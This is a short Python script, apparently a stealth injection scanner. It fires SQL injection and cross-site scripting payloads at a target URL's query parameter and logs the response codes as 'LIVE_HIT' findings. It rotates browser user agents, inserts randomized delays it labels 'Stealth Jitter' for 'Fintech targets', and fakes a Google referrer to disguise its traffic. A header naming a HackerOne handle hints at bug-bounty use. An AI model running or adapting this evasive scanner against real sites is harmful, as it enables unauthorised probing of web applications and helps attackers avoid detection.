import json
import requests
import sys
import time
import os
import random

def get_random_ua():
    uas = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1"
    ]
    return random.choice(uas)

def human_delay():
    delay = random.uniform(8.0, 15.0) # Increased delay for Fintech targets
    print(f"[💤] Stealth Jitter: {delay:.2f}s...")
    time.sleep(delay)

def run_scan(target_url):
    try:
        if os.path.exists("public/metadata.json"):
            with open("public/metadata.json", "r") as f:
                data = json.load(f)
                ammunition = data.get('mutated_payloads', []) or ["' OR 1=1--", "<script>alert(1)</script>"]
    except:
        ammunition = ["' OR 1=1--"]

    print(f"[*] Targeting: {target_url}")

    for payload in ammunition:
        human_delay()
        headers = {
            'User-Agent': get_random_ua(),
            'X-HackerOne': 'glazzeyboy91',
            'Accept-Language': 'en-US,en;q=0.9',
            'Referer': 'https://www.google.com/' # Mimic referral traffic
        }
        
        test_url = f"{target_url}?id={payload}"
        print(f"[~] Injecting: {payload[:15]}...")
        
        try:
            response = requests.get(test_url, headers=headers, timeout=15)
            # Log results
            with open("public/metadata.json", "r+") as f:
                res_data = json.load(f)
                res_data['findings'].append({"type": "LIVE_HIT", "target": test_url, "code": response.status_code})
                f.seek(0); json.dump(res_data, f, indent=4); f.truncate()
        except Exception as e:
            print(f"[-] Blocked/Timeout: {e}")

if __name__ == "__main__":
    if len(sys.argv) > 1: run_scan(sys.argv[1])
